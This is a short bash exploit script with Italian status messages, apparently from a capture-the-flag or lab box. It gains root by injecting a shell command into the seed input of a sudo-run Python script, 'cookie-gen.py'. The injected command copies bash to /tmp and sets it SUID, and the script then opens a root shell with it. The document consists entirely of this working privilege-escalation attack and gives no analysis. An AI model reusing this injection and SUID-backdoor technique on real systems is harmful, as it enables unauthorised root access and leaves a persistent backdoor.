#!/bin/bash

set -euo pipefail

SCRIPT="/usr/bin/python3 /home/team-tasks/cookie-gen.py"
SEED="1"       
PAYLOAD="cp /bin/bash /tmp/bash;chmod u+s /tmp/bash"

echo "[*] Iniezione del payload tramite il seed di cookie-gen.py..."

sudo $SCRIPT <<< "${SEED};${PAYLOAD}" >/dev/null

if [[ -u /tmp/bash ]]; then
    echo "[+] Copia SUID di bash creata in /tmp/bash."
    echo "[*] Apertura shell root (/tmp/bash -p)..."
    exec /tmp/bash -p
else
    echo "[-] Escalation fallita: /tmp/bash non e' SUID."
    exit 1
fi